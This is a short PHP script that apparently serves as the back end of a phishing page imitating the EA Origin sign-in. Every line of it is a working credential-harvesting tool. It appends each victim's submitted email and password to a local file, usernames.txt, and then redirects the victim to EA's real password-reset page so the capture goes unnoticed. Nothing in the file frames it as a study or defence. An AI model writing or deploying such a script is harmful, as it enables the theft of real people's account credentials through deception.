<?php

file_put_contents("usernames.txt", "Origin :- username : " . $_POST['email'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
exit();
